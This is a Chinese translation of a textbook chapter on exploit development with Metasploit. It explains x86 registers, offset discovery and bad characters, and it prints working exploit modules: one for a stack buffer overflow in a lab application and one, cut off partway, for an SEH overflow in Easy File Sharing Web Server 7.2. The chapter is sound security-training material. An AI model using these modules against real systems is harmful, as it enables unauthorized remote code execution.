# 第十三章：利用公式化过程

本章主要是关于创建利用模块，并帮助理解内置的 Metasploit 实用程序如何改进创建过程。在本章中，我们将涵盖各种示例漏洞，并尝试开发利用这些漏洞的方法和方法。除此之外，我们的主要重点将放在为 Metasploit 构建利用模块上。我们还将涵盖各种工具，这些工具将有助于在 Metasploit 中编写利用程序。编写利用程序的一个重要方面是计算机体系结构。如果我们不包括体系结构的基础知识，我们将无法理解利用程序在较低层次上的工作方式。因此，让我们首先讨论一下系统体系结构和编写利用程序所需的基本要素。

在本章结束时，我们将更多地了解以下主题：

+   利用程序开发的阶段

+   编写利用程序时需要考虑的参数

+   各种寄存器的工作原理

+   如何模糊软件

+   如何在 Metasploit 框架中编写利用程序

+   使用 Metasploit 绕过保护机制

# 利用程序的绝对基础知识

在本节中，我们将看一下利用所需的最关键组件。我们将讨论在不同体系结构中支持的各种寄存器。我们还将讨论**扩展指令指针**（**EIP**）和**扩展堆栈指针**（**ESP**），以及它们在编写利用程序中的重要性。我们还将研究**无操作**（**NOP**）和**跳转**（**JMP**）指令，以及它们在编写各种软件的利用程序中的重要性。

# 基础知识

让我们先了解编写利用程序时必要的基础知识。

以下术语基于硬件、软件和安全角度来看待利用程序开发：

+   **寄存器**：这是处理器上用于存储信息的区域。此外，处理器利用寄存器来处理进程执行、内存操作、API 调用等。

+   **x86**：这是一类系统体系结构，主要出现在基于英特尔的系统上，通常是 32 位系统，而 x64 是 64 位系统。

+   **汇编语言**：这是一种具有简单操作的低级编程语言。然而，阅读汇编代码并维护它是一件难事。

+   **缓冲区**：缓冲区是程序中的固定内存持有者，根据它们所持有的内存类型，它们将数据存储到堆栈或堆中。

+   **调试器**：调试器允许对可执行文件进行逐步分析，包括停止、重新启动、中断和操纵进程内存、寄存器、堆栈等。广泛使用的调试器包括 Immunity Debugger、GDB 和 OllyDbg。

+   **Shellcode**：这是用于在目标系统上执行的机器语言。在历史上，它被用于运行一个 shell 进程，使攻击者能够访问系统。因此，shellcode 是处理器理解的一组指令。

+   **堆栈**：这充当数据的占位符，并使用**后进先出**（**LIFO**）方法进行存储，这意味着最后插入的数据首先被移除。

+   **堆**：堆是主要用于动态分配的内存区域。与堆栈不同，我们可以在任何给定时间分配、释放和阻塞。

+   **缓冲区溢出**：这意味着提供给缓冲区的数据超过了其容量。

+   格式字符串错误：这些是与文件或控制台中的打印语句相关的错误，当给定一组变量数据时，可能会透露有关程序的有价值的信息。

+   **系统调用**：这些是由正在执行的程序调用的系统级方法。

# 体系结构

体系结构定义了系统各个组件的组织方式。让我们先了解必要的组件，然后我们将深入研究高级阶段。

# 系统组织基础知识

在我们开始编写程序和执行其他任务，比如调试之前，让我们通过以下图表来了解系统中组件的组织结构：

![](img/bc9235d5-26d0-472c-a611-2d94613b1920.png)

我们可以清楚地看到系统中的每个主要组件都是通过系统总线连接的。因此，CPU、内存和 I/O 设备之间的所有通信都是通过系统总线进行的。

CPU 是系统中的中央处理单元，确实是系统中最重要的组件。因此，让我们通过以下图表来了解 CPU 中的组织结构：

![](img/d2d85356-7201-4345-a86f-af4dd66ef920.png)

上述图表显示了 CPU 的基本结构，包括控制单元（CU）、执行单元（EU）、寄存器和标志等组件。让我们通过下表来了解这些组件是什么：

| **组件** | **工作**  |
| --- | --- |
| 控制单元 | 控制单元负责接收和解码指令，并将数据存储在内存中。 |
| 执行单元 | 执行单元是实际执行发生的地方。 |
| 寄存器 | 寄存器是占位内存变量，有助于执行。 |
| Flags | 这些用于指示执行过程中发生的事件。 |

# 寄存器

寄存器是高速计算机内存组件。它们也位于内存层次结构的速度图表的顶部。我们通过它们可以容纳的位数来衡量寄存器；例如，一个 8 位寄存器和一个 32 位寄存器分别可以容纳 8 位和 32 位的内存。**通用目的**、**段**、**EFLAGS**和**索引寄存器**是系统中不同类型的相关寄存器。它们负责执行系统中几乎每个功能，因为它们保存了所有要处理的值。让我们来看看它们的类型：

| **寄存器** | **目的**  |
| --- | --- |
| EAX | 这是一个累加器，用于存储数据和操作数。大小为 32 位。 |
| EBX | 这是基址寄存器，指向数据的指针。大小为 32 位。 |
| ECX | 这是一个计数器，用于循环目的。大小为 32 位。 |
| EDX | 这是一个数据寄存器，存储 I/O 指针。大小为 32 位。 |
| ESI/EDI | 这些是用作内存操作数据指针的索引寄存器。它们也是 32 位大小。 |
| ESP | 这个寄存器指向栈顶，当栈中有数据被推入或弹出时，它的值会发生变化。大小为 32 位。 |
| EBP | 这是堆栈数据指针寄存器，大小为 32 位。 |
| EIP | 这是指令指针，大小为 32 位，在本章中是最关键的指针。它还保存着下一条要执行的指令的地址。 |
| SS、DSES、CS、FS 和 GS | 这些是段寄存器，大小为 16 位。 |

您可以在以下网址了解有关架构基础知识和各种系统调用和利用指令的更多信息：[`resources.infosecinstitute.com/debugging-fundamentals-for-exploit-development/#x86`](http://resources.infosecinstitute.com/debugging-fundamentals-for-exploit-development/#x86)。

# 使用 Metasploit 利用基于栈的缓冲区溢出

缓冲区溢出漏洞是一种异常情况，当向缓冲区写入数据时，它超出了缓冲区的大小并覆盖了内存地址。以下图表显示了缓冲区溢出的一个基本示例：

![](img/8d93ff26-46d3-446d-b98f-0f845634725c.png)

上述图表的左侧显示了应用程序的外观。然而，右侧表示了应用程序在满足缓冲区溢出条件时的行为。

那么，我们如何利用缓冲区溢出漏洞呢？答案很简单。如果我们知道将覆盖 EIP（指令指针）开始之前的一切的确切数据量，我们可以将任何内容放入 EIP 并控制下一条指令的地址。

因此，首先要找出足够好的字节数，以填充 EIP 开始之前的所有内容。在接下来的部分中，我们将看到如何使用 Metasploit 实用程序找到确切的字节数。

# 崩溃易受攻击的应用程序

我们将使用一个使用不安全函数的自定义易受攻击的应用程序。让我们尝试从命令 shell 中运行该应用程序，如下所示：

![](img/f0567bb0-648f-46f5-aeac-807ee2a49771.png)

我们可以看到这是一个小型示例应用程序，它监听 TCP 端口`200`。我们将通过 Telnet 连接到该应用程序的端口`200`并向其提供随机数据，如下面的屏幕截图所示：

![](img/e0087caa-4393-4a14-9ba4-16fb025e7d5f.png)

在我们提供数据之后，我们会看到与目标的连接丢失。这是因为应用程序服务器崩溃了。让我们看看目标系统上的情况：

![](img/a50dc75e-760d-4511-a698-519e918086c4.png)

通过点击此处查看错误报告，我们可以看到以下信息：

![](img/dbaf1619-08ff-4ff7-8788-417dc810fcd9.png)

崩溃的原因是应用程序未能处理下一条指令的地址，位于 41414141。这有什么提示吗？值 41 是字符 A 的十六进制表示。发生的情况是我们的输入越过了缓冲区的边界，继续覆盖了 EIP 寄存器。因此，由于下一条指令的地址被覆盖，程序尝试在 41414141 处找到下一条指令的地址，这不是有效地址。因此，它崩溃了。

从以下网址下载我们在示例中使用的示例应用程序：[`redstack.net/blog/category/How%20To.html`](http://redstack.net/blog/category/How%20To.html)。

# 构建利用基础

为了利用该应用程序并访问目标系统，我们需要了解以下表中列出的内容：

| **组件** | **用途** |
| --- | --- |
| 在上一节中，我们崩溃了应用程序。然而，为了利用该应用程序，我们需要知道足够填充空间和 EBP 寄存器的输入的确切大小，这样我们提供的任何内容都会直接进入 EIP 寄存器。我们将足够好以使我们正好在 EIP 寄存器之前的数据量称为偏移量。 |
| 跳转地址/Ret | 这是要在 EIP 寄存器中覆盖的实际地址。澄清一下，这是来自 DLL 文件的 JMP ESP 指令的地址，它有助于跳转到有效负载。 |
| 坏字符 | 坏字符是可能导致有效负载终止的字符。假设包含空字节（0x00）的 shellcode 被发送到网络上。它将过早终止缓冲区，导致意外结果。应避免使用坏字符。 |

让我们通过以下图表来了解该应用程序的利用部分：

![](img/598f5a96-1a5f-4d6b-8cc5-33002b0f9466.png)

查看前面的图表，我们必须执行以下步骤：

1.  用用户输入覆盖缓冲区和 EBP 寄存器，就在 EIP 寄存器开始之前。足够好的值将是偏移值。

1.  用相关 DLL 中的 JMP ESP 地址覆盖 ESP。

1.  在有效负载之前提供一些填充以消除不规则性。

1.  最后，提供要执行的 shellcode。

在接下来的部分，我们将详细介绍所有这些步骤。

# 计算偏移量

正如我们在前一节中看到的，利用的第一步是找出偏移量。Metasploit 通过使用两个不同的工具`pattern_create`和`pattern_offset`来辅助这个过程。

# 使用 pattern_create 工具

在前一节中，我们发现通过提供随机数量的`A`字符，我们能够使应用程序崩溃。然而，我们已经学到，要构建一个有效的利用程序，我们需要找出这些字符的确切数量。Metasploit 内置的工具`pattern_create`可以在短时间内为我们完成这项工作。它生成的模式可以供应用程序使用，而不是`A`字符，并且根据覆盖 EIP 寄存器的值，我们可以使用其对应的工具`pattern_offset`快速找出确切的字节数。让我们看看如何做到这一点：

![](img/c8e0706f-008d-491f-ae8b-1b3502f68cc4.png)

我们可以看到，在`/tools/exploit/`目录中运行`pattern_create.rb`脚本生成了 1000 字节的模式。这个输出可以提供给有漏洞的应用程序，如下所示：

![](img/fdc96fa9-7533-49ea-84d4-52c26de6ad52.png)

查看目标端点，我们可以看到偏移值，如下截图所示：

![](img/0cb70ce2-876e-416b-a126-8b4b4a78be52.png)

我们有 72413372 作为覆盖 EIP 寄存器的地址。

# 使用 pattern_offset 工具

在前一节中，我们用 72413372 覆盖了 EIP 地址。让我们使用`pattern_offset`工具找出覆盖 EIP 所需的确切字节数。这个工具需要两个参数；第一个是地址，第二个是长度，使用`pattern_create`生成的长度为`1000`。让我们找出偏移量，如下所示：

![](img/6b37cb6a-cc58-4840-a757-2b77a1283c02.png)

确切匹配在 520 处找到。因此，在 520 个字符后的任何 4 个字节都成为 EIP 寄存器的内容。

# 查找 JMP ESP 地址

让我们再次查看我们用来理解利用的图表，如下所示：

![](img/240fc9e7-88f7-4b82-8d0c-145b0168ce87.png)

我们完成了前面图表中的第一步。我们的下一个任务是找到 JMP ESP 地址。我们需要 JMP ESP 指令的地址，因为我们的有效载荷将加载到 ESP 寄存器中，我们不能仅仅在覆盖缓冲区后指向有效载荷。因此，我们需要来自外部 DLL 的 JMP ESP 指令的地址，该指令将要求程序跳转到我们有效载荷开头处的 ESP 内容。

要找到跳转地址，我们将需要一个调试器，以便我们可以看到有漏洞的应用程序加载了哪些 DLL 文件。在我看来，最好的选择是 Immunity Debugger。Immunity Debugger 带有大量插件，可以帮助编写利用程序。

# 使用 Immunity Debugger 查找可执行模块

Immunity Debugger 是一个帮助我们在运行时了解应用程序行为的应用程序。它还可以帮助我们识别缺陷、寄存器的值、反向工程应用程序等。在 Immunity Debugger 中分析应用程序不仅有助于我们更好地理解各种寄存器中包含的值，还会告诉我们有关目标应用程序的各种信息，比如崩溃发生的指令和与可执行文件链接的可执行模块。

可以通过从文件菜单中选择“打开”直接将可执行文件加载到 Immunity Debugger 中。我们也可以通过选择“附加”选项将正在运行的应用程序附加到 Immunity Debugger 中。当我们导航到文件|附加时，它会向我们呈现目标系统上正在运行的进程列表。我们只需要选择适当的进程。然而，这里有一个重要的问题，当一个进程附加到 Immunity Debugger 时，默认情况下，它会处于暂停状态。因此，请确保按下播放按钮，将进程的状态从暂停状态更改为运行状态。让我们看看如何将进程附加到 Immunity Debugger：

![](img/83c1ae4f-49e1-43b4-8cf6-55da312fbf12.png)

按下附加按钮后，让我们看看哪些 DLL 文件加载到有漏洞的应用程序中，方法是导航到“查看”并选择“可执行模块”选项。我们将看到以下 DLL 文件列表：

![](img/2455a72c-d8d8-4834-a8fe-6c0df10f7e60.png)

现在我们已经有了 DLL 文件的列表，我们需要从其中一个文件中找到 JMP ESP 地址。

# 使用 msfpescan

在前面的部分中，我们找到了与有漏洞的应用程序相关联的 DLL 模块。我们可以使用 Immunity Debugger 来查找 JMP ESP 指令的地址，这是一个冗长而耗时的过程，或者我们可以使用`msfpescan`从 DLL 文件中搜索 JMP ESP 指令的地址，这是一个更快的过程，消除了手动搜索的步骤。

运行`msfpescan`给我们以下输出：

![](img/639fd66e-cae6-4834-b35e-6907671bc9cd.png)

诸如`msfbinscan`和`msfrop`之类的实用程序可能不会出现在默认的 Kali Linux 中随 Metasploit 一起安装的版本中。切换到 Ubuntu 并手动安装 Metasploit 以获取这些实用程序。

我们可以执行各种任务，比如找到基于 SEH 的缓冲区溢出的 POP-POP-RET 指令地址，显示特定地址处的代码等等，都可以通过`msfpescan`来完成。我们只需要找到 JMP ESP 指令的地址。我们可以使用`-j`开关，后面跟着寄存器名称 ESP 来实现这一点。让我们从`ws2_32.dll`文件开始搜索 JMP ESP 地址：

![](img/b26e3564-30b2-4b31-8912-04fc3352baa8.png)

命令的结果返回了`0x71ab9372`。这是`ws2_32.dll`文件中 JMP ESP 指令的地址。我们只需要用这个地址覆盖 EIP 寄存器，以便执行跳转到 ESP 寄存器中的 shellcode。

# 填充空间

让我们修改利用图并了解我们在利用过程中的确切位置：

![](img/34cc8528-2fa8-4f2f-a270-0d14fecf206d.png)

我们已经完成了第二步。然而，这里有一个重要的问题，有时 shellcode 的前几个字节可能会被剥离，导致 shellcode 无法执行。在这种情况下，我们应该用前缀 NOP 填充 shellcode，以便 shellcode 的执行可以无缝进行。

假设我们将`ABCDEF`发送到 ESP，但是当我们使用 Immunity Debugger 进行分析时，我们只得到了`DEF`的内容。在这种情况下，我们缺少了三个字符。因此，我们需要用三个 NOP 字节或其他随机数据填充有效负载。

让我们看看是否需要为这个有漏洞的应用程序填充 shellcode：

![](img/a0b9fe00-925e-4eb7-8284-38bee07a7a7b.png)

在前面的截图中，我们根据缓冲区大小的值创建了数据。我们知道偏移量是`520`。因此，我们提供了`520`，然后是 JMP ESP 地址，以小端格式呈现，随后是随机文本`ABCDEF`。一旦我们发送了这些数据，我们就可以在 Immunity Debugger 中分析 ESP 寄存器，如下所示：

![](img/788e7c69-e7f1-4db2-ba1c-6f2611b9a263.png)

我们可以看到随机文本`ABCDEF`中缺少了字母`A`。因此，我们只需要一个字节的填充来实现对齐。在 shellcode 之前用一些额外的 NOP 进行填充是一个很好的做法，以避免 shellcode 解码和不规则性问题。

# NOP 的相关性

NOP 或 NOP-sled 是无操作指令，仅仅将程序执行滑动到下一个内存地址。我们使用 NOP 来到达内存地址中的所需位置。我们通常在 shellcode 开始之前提供 NOP，以确保在内存中成功执行，同时不执行任何操作，只是在内存地址中滑动。十六进制格式中的`\x90`指令代表 NOP 指令。

# 确定坏字符

有时，即使为利用正确设置了一切，我们可能永远无法利用系统。或者，可能会发生我们的利用成功执行，但有效载荷无法运行的情况。这可能发生在目标系统对利用中提供的数据进行截断或不正确解析，导致意外行为的情况下。这将使整个利用无法使用，我们将努力将 shell 或 Meterpreter 放入系统中。在这种情况下，我们需要确定阻止执行的坏字符。我们可以通过查找匹配的类似利用模块并在我们的利用模块中使用这些坏字符来避免这种情况。

我们需要在利用的`Payload`部分定义这些坏字符。让我们看一个例子：

```
'Payload'        => 
      { 
        'Space'    => 800, 
        'BadChars' => "\x00\x20\x0a\x0d", 
        'StackAdjustment' => -3500, 
      }, 
```

上述部分摘自`/exploit/windows/ftp`目录下的`freeftpd_user.rb`文件。列出的选项表明有效载荷的空间应小于`800`字节，并且有效载荷应避免使用`0x00`、`0x20`、`0x0a`和`0x0d`，分别是空字节、空格、换行和回车。

有关查找坏字符的更多信息，请访问：[`resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-6-dealing-with-bad-characters-jmp-instruction/`](http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-6-dealing-with-bad-characters-jmp-instruction/)。

# 确定空间限制

`Payload 字段`中的`Space`变量定义了用于 shellcode 的总大小。我们需要为`Payload`分配足够的空间。如果`Payload`很大，而分配的空间小于有效载荷的 shellcode，它将无法执行。此外，在编写自定义利用时，shellcode 应尽可能小。我们可能会遇到这样的情况，即可用空间仅为 200 字节，但可用 shellcode 至少需要 800 字节的空间。在这种情况下，我们可以将一个较小的第一阶段 shellcode 放入缓冲区中，它将执行并下载第二个更大的阶段以完成利用。

对于各种有效载荷的较小 shellcode，请访问：[`shell-storm.org/shellcode/`](http://shell-storm.org/shellcode/)。

# 编写 Metasploit 利用模块

让我们回顾一下我们的利用过程图表，并检查我们是否可以完成模块：

![](img/b076501b-a46d-4a63-91ea-1e5a96a8bf9a.png)

我们可以看到我们拥有开发 Metasploit 模块的所有基本要素。这是因为在 Metasploit 中，有效载荷生成是自动化的，并且也可以随时更改。所以，让我们开始吧：

```
class MetasploitModule < Msf::Exploit::Remote 
  Rank = NormalRanking 

  include Msf::Exploit::Remote::Tcp 

  def initialize(info = {}) 
    super(update_info(info, 
      'Name'                 => 'Stack Based Buffer Overflow Example', 
      'Description'    => %q{ 
         Stack Based Overflow Example Application Exploitation Module 
      }, 
      'Platform'             => 'win', 
      'Author'         => 
        [ 
          'Nipun Jaswal' 
        ], 
      'Payload' => 
      { 
      'space' => 1000, 
      'BadChars' => "\x00\xff", 
      }, 
      'Targets' => 
       [ 
             ['Windows XP SP2',{ 'Ret' => 0x71AB9372, 'Offset' => 520}] 
       ], 
      'DisclosureDate' => 'Mar 04 2018' 
   )) 
   register_options( 
   [ 
         Opt::RPORT(200) 
   ]) 
  end 
```

在编写代码之前，让我们看一下我们在这个模块中使用的库：

| **包含语句** | **路径** | **用途** |
| --- | --- | --- |
| `Msf::Exploit::Remote::Tcp` | `/lib/msf/core/exploit/tcp.rb` | TCP 库文件提供基本的 TCP 功能，如连接、断开连接、写入数据等 |

与我们在第十二章中构建模块的方式相同，*重新发明 Metasploit*，利用模块首先包括必要的库路径，然后包括来自这些路径的所需文件。我们将模块类型定义为`Msf::Exploit::Remote`，表示远程利用。接下来，我们有`initialize`构造方法，在其中定义了名称、描述、作者信息等。然而，我们可以看到`initialize`方法中有大量新的声明。让我们看看它们是什么：

| **声明** | **值** | **用法** |
| --- | --- | --- |
| `平台` | `win` | 定义了利用将要针对的平台类型。win 表示利用将可用于基于 Windows 的操作系统。 |
| `披露日期` | `2018 年 3 月 4 日` | 漏洞披露的日期。 |
| `目标` | `Ret` | 特定操作系统的`Ret`字段定义了我们在前一节中找到的 JMP ESP 地址。 |
| `0x71AB9372` |
| `目标` | `Offset` | 特定操作系统的`Offset`字段定义了在覆盖 EIP 之前填充缓冲区所需的字节数。我们在前一节中找到了这个值。 |
| `520` |
| `有效载荷` | `空间` | 在有效载荷声明中，`空间`变量定义了有效载荷可以使用的最大空间量。这相对重要，因为有时我们的空间不足以加载我们的 shellcode。 |
| `1000` |
| `有效载荷` | `BadChars` | 在有效载荷声明中，`BadChars`变量定义了在有效载荷生成过程中要避免的不良字符。声明不良字符的做法将确保稳定性，并删除可能导致应用程序崩溃或无法执行有效载荷的字节。 |
| `\x00\xff` |

我们还在`register_options`部分将利用模块的默认端口定义为`200`。让我们来看看剩下的代码：

```
def exploit 
    connect 
    buf = make_nops(target['Offset']) 
    buf = buf + [target['Ret']].pack('V') + make_nops(30) + payload.encoded 
    sock.put(buf) 
    handler 
    disconnect 
  end 
end
```

让我们了解一些在前面的代码中使用的重要函数：

| **函数** | **库** | **用法** |
| --- | --- | --- |
| `make_nops` | `/lib/msf/core/exploit.rb` | 此方法用于通过传递`n`作为计数来创建`n`个 NOP |
| `连接` | `/lib/msf/core/exploit/tcp.rb` | 调用此方法来与目标建立连接 |
| `断开连接` | `/lib/msf/core/exploit/tcp.rb` | 调用此方法来断开与目标的现有连接 |
| `处理程序` | `/lib/msf/core/exploit.rb` | 将连接传递给相关的有效载荷处理程序，以检查是否成功利用了漏洞并建立了连接 |

我们在前一节中看到，`run`方法被用作辅助模块的默认方法。然而，对于利用，`exploit`方法被认为是默认的主要方法。

我们首先使用`connect`连接到目标。使用`make_nops`函数，我们通过传递我们在`initialize`部分中定义的`target`声明的`Offset`字段，创建了 520 个 NOP。我们将这 520 个 NOP 存储在`buf`变量中。在下一条指令中，我们通过从`target`声明的`Ret`字段中获取其值，将 JMP ESP 地址附加到`buf`中。使用`pack('V')`，我们得到了地址的小端格式。除了`Ret`地址，我们还附加了一些 NOP 作为 shellcode 之前的填充。使用 Metasploit 的一个优点是能够在运行时切换有效载荷。因此，简单地使用`payload.encoded`附加有效载荷将当前选择的有效载荷添加到`buf`变量中。

接下来，我们直接使用`sock.put`将`buf`的值发送到连接的目标。我们运行处理程序方法来检查目标是否成功被利用，以及是否与其建立了连接。最后，我们使用`disconnect`从目标断开连接。让我们看看我们是否能够利用服务：

![](img/af70490a-44be-467f-8139-b0928c768820.png)

我们设置所需的选项和有效载荷为`windows/meterpreter/bind_tcp`，表示直接连接到目标。最初，我们可以看到我们的利用完成了，但没有创建会话。在这一点上，我们通过编辑利用代码将坏字符从`\x00\xff`更改为`\x00\x0a\x0d\x20`，如下所示：

![](img/4dc4b10e-30bb-4d09-ae86-622b70595b79.png)

我们可以使用`edit`命令直接从 Metasploit 修改模块。默认情况下，文件将在 VI 编辑器中加载。但是，如果你不比我更好，你会坚持使用 nano 编辑器进行更改。一旦我们更改了模块，就必须重新加载到 Metasploit 中。对于我们当前正在使用的模块，我们可以使用`reload`命令重新加载，如前面的图像所示。重新运行模块，我们轻松地获得了对目标的 Meterpreter 访问。现在我们已经成功完成了第一个利用模块，我们将在下一个示例中跳转到一个稍微更高级的利用模块。

# 使用 Metasploit 利用基于 SEH 的缓冲区溢出

异常处理程序是捕获程序执行过程中生成的异常和错误的代码模块。这使得程序可以继续执行而不会崩溃。Windows 操作系统具有默认的异常处理程序，通常在应用程序崩溃并抛出一个弹出窗口时看到它们，上面写着*XYZ 程序遇到错误并需要关闭*。当程序生成异常时，相应的 catch 代码的地址将从堆栈中加载并调用。然而，如果我们设法覆盖处理程序的 catch 代码在堆栈中的地址，我们将能够控制应用程序。让我们看看当应用程序实现异常处理程序时，堆栈中的排列情况：

![](img/a93d591e-bf18-4ce8-95b5-59c5e4f1d09d.png)

在上图中，我们可以看到堆栈中 catch 块的地址。我们还可以看到，在右侧，当我们向程序提供足够的输入时，它也会覆盖堆栈中 catch 块的地址。因此，我们可以很容易地通过 Metasploit 中的`pattern_create`和`pattern_offset`工具找到覆盖 catch 块地址的偏移值。让我们看一个例子：

![](img/f377ffa0-29fa-4d39-842e-a897144ddb6b.png)

我们创建一个`4000`个字符的模式，并使用`TELNET`命令将其发送到目标。让我们在 Immunity Debugger 中查看应用程序的堆栈：

![](img/40c9658d-6cf6-40f4-a9f2-4990837bfb63.png)

我们可以看到应用程序的堆栈窗格中，SE 处理程序的地址被覆盖为`45346E45`。让我们使用`pattern_offset`找到确切的偏移量，如下所示：

![](img/764f935e-f9f6-473d-9893-984703abe76d.png)

我们可以看到正确的匹配在`3522`处。然而，这里需要注意的一个重要点是，根据 SEH 帧的设计，我们有以下组件：

![](img/1e4a5343-310c-4ade-b579-4d81a3afb6ab.png)

SEH 记录包含前`4`个字节作为下一个 SEH 处理程序的地址，下一个`4`个字节作为 catch 块的地址。一个应用程序可能有多个异常处理程序。因此，特定的 SEH 记录将前 4 个字节存储为下一个 SEH 记录的地址。让我们看看如何利用 SEH 记录：

1.  我们将在应用程序中引发异常，以便调用异常处理程序。

1.  我们将使用 POP/POP/RETN 指令的地址来覆盖 catch 处理程序字段的地址。这是因为我们需要将执行切换到下一个 SEH 帧的地址（在 catch 处理程序地址的前 4 个字节）。我们将使用 POP/POP/RET，因为调用 catch 块的内存地址保存在堆栈中，下一个处理程序的指针地址在 ESP+8（ESP 被称为堆栈的顶部）。因此，两个 POP 操作将重定向执行到下一个 SEH 记录的开始的 4 个字节的地址。

1.  在第一步中提供输入时，我们将使用 JMP 指令覆盖下一个 SEH 帧的地址到我们的有效载荷。因此，当第二步完成时，执行将跳转指定字节数到 shellcode。

1.  成功跳转到 shellcode 将执行有效载荷，我们将获得对目标的访问权限。

让我们通过以下图表来理解这些步骤：

![](img/339c6f70-ba02-46a6-ad7a-344b7c570e10.png)

在前面的图中，当发生异常时，它调用处理程序的地址（已经被 POP/POP/RET 指令的地址覆盖）。这会导致执行 POP/POP/RET 并将执行重定向到下一个 SEH 记录的地址（已经被短跳转覆盖）。因此，当 JMP 执行时，它指向 shellcode，并且应用程序将其视为另一个 SEH 记录。

# 构建利用基础

现在我们已经熟悉了基础知识，让我们看看我们需要为 SEH-based 漏洞开发一个工作利用所需的基本要素：

| **组件** | **用途** |
| --- | --- |
| 偏移量 | 在这个模块中，偏移量将指的是足够覆盖 catch 块地址的输入的确切大小。 |
| POP/POP/RET 地址 | 这是来自 DLL 的 POP-POP-RET 序列的地址。 |
| 短跳转指令 | 为了移动到 shellcode 的开始，我们需要进行指定字节数的短跳转。因此，我们需要一个短跳转指令。 |

我们已经知道我们需要一个有效载荷，一组要防止的坏字符，空间考虑等等。

# 计算偏移量

Easy File Sharing Web Server 7.2 应用程序是一个 Web 服务器，在请求处理部分存在漏洞，恶意的 HEAD 请求可以导致缓冲区溢出并覆盖 SEH 链中的地址。

# 使用 pattern_create 工具

我们将使用`pattern_create`和`pattern_offset`工具来找到偏移量，就像我们之前在将有漏洞的应用程序附加到调试器时所做的那样。让我们看看我们如何做到这一点：

![](img/2b5a05e9-2bed-4b4d-b1e7-5bf685cabcdd.png)

我们创建了一个包含`10000`个字符的模式。现在，让我们将模式提供给端口`80`上的应用程序，并在 Immunity Debugger 中分析其行为。我们会看到应用程序停止运行。让我们通过导航到菜单栏中的 View 并选择 SEH 链来查看 SEH 链：

![](img/b5e5dc8f-caef-43ed-bb4c-e23a77d16928.png)

点击 SEH 链选项，我们将能够看到被覆盖的 catch 块地址和下一个 SEH 记录地址被我们提供的数据覆盖：

![](img/271c5654-7c49-4d54-842d-b9c23a143982.png)

# 使用 pattern_offset 工具

让我们找到下一个 SEH 帧地址和 catch 块地址的偏移量，如下所示：

![](img/ea02cb23-da13-4881-85a4-461d33998a83.png)

我们可以看到包含下一个 SEH 记录的内存地址的 4 个字节从`4061`字节开始，而 catch 块的偏移量则从这 4 个字节之后开始；也就是从`4065`开始。

# 查找 POP/POP/RET 地址

在之前讨论过，我们需要地址到 POP/POP/RET 指令来加载地址到下一个 SEH 帧记录并跳转到有效载荷。我们知道我们需要从外部 DLL 文件加载地址。然而，大多数最新的操作系统都使用 SafeSEH 保护编译他们的 DLL 文件。因此，我们需要从一个没有实现 SafeSEH 机制的 DLL 模块中获取 POP/POP/RET 指令的地址。

示例应用程序在以下`HEAD`请求上崩溃；即`HEAD`后面是由`pattern_create`工具创建的垃圾模式，然后是`HTTP/1.0rnrn`。

# Mona 脚本

Mona 脚本是 Immunity Debugger 的 Python 驱动插件，提供了各种利用选项。该脚本可以从以下网址下载：[`github.com/corelan/mona/blob/master/mona.py`](https://github.com/corelan/mona/blob/master/mona.py)。将脚本放入`\Program Files\Immunity Inc\Immunity Debugger\PyCommands`目录中即可轻松安装。

现在让我们使用 Mona 并运行`!mona modules`命令来分析 DLL 文件，如下：

![](img/5de60269-f16b-4189-9753-d8c23383de07.png)

从前面的截图中可以看出，我们只有很少的没有实现 SafeSEH 机制的 DLL 文件。让我们使用这些文件来找到 POP/POP/RET 指令的相关地址。

有关 Mona 脚本的更多信息，请访问：[`www.corelan.be/index.php/2011/07/14/mona-py-the-manual/`](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)。

# 使用 msfpescan

我们可以使用`msfpescan`的`-s`开关轻松找到`ImageLoad.dll`文件中的 POP/POP/RET 指令序列。让我们使用它。

![](img/5ad5e795-2155-47f0-b223-6c82bd0e9d4d.png)

让我们使用一个安全地址，消除可能导致 HTTP 协议问题的地址，比如连续重复的零，如下：

![](img/71da2ab5-e7dc-4092-9ce3-df3e361b7481.png)

我们将使用`0x10019798`作为 POP/POP/RET 地址。现在我们已经有了撰写利用程序的两个关键组件，即偏移量和要加载到 catch 块中的地址，即我们的 POP/POP/RET 指令的地址。我们只需要短跳转的指令，这将被加载到下一个 SEH 记录的地址，这将帮助我们跳转到 shellcode。Metasploit 库将使用内置函数为我们提供短跳转指令。

# 编写 Metasploit SEH 利用模块

现在我们已经有了利用目标应用程序的所有重要数据，让我们继续在 Metasploit 中创建一个利用模块，如下：

```
class MetasploitModule < Msf::Exploit::Remote 

  Rank = NormalRanking 

  include Msf::Exploit::Remote::Tcp 
  include Msf::Exploit::Seh 

  def initialize(info = {}) 
    super(update_info(info, 
      'Name'           => 'Easy File Sharing HTTP Server 7.2 SEH Overflow', 
      'Description'    => %q{ 
        This module demonstrate SEH based overflow example 
      }, 
      'Author'         => 'Nipun', 
      'License'        => MSF_LICENSE, 
      'Privileged'     => true, 
      'DefaultOptions' => 
        { 
          'EXITFUNC' => 'thread', 
     'RPORT' => 80, 
        }, 
      'Payload'        => 
        { 
          'Space'    => 390, 
          'BadChars' => "x00x7ex2bx26x3dx25x3ax22x0ax0dx20x2fx5cx2e", 
        }, 
      'Platform'       => 'win', 
      'Targets'        => 
        [ 
          [ 'Easy File Sharing 7.2 HTTP', { 'Ret' => 0x10019798, 'Offset' => 4061 } ], 
        ], 
      'DisclosureDate' => 'Mar 4 2018', 
      'DefaultTarget'  => 0)) 
  end 
```

在处理各种模块的头部部分后，我们开始包含库文件的所需部分。接下来，我们定义类和模块类型，就像我们在之前的模块中所做的那样。我们通过定义名称、描述、作者信息、许可信息、有效载荷选项、披露日期和默认目标来开始`initialize`部分。我们在`Ret`返回地址变量和`Offset`字段下使用`4061`作为 POP/POP/RET 指令的地址。我们使用`4061`而不是`4065`，因为 Metasploit 将自动生成短跳转指令到 shellcode；因此，我们将从`4065`字节前开始 4 个字节，以便将短跳转放入载体中，以用于下一个 SEH 记录的地址。

在继续之前，让我们看一下我们将在模块中使用的重要函数。我们已经看到了`make_nops`、`connect`、`disconnect`和`handler`的用法：

| **函数** | **库** | **用法** |
| --- | --- | --- |
| `generate_seh_record()` | `/lib/msf/core/exploit/seh.rb` | 这个库提供了生成 SEH 记录的方法。 |

让我们继续编写代码，如下：

```
def exploit 
  connect 
  weapon = "HEAD " 
  weapon << make_nops(target['Offset']) 
  weapon << generate_seh_record(target.ret) 
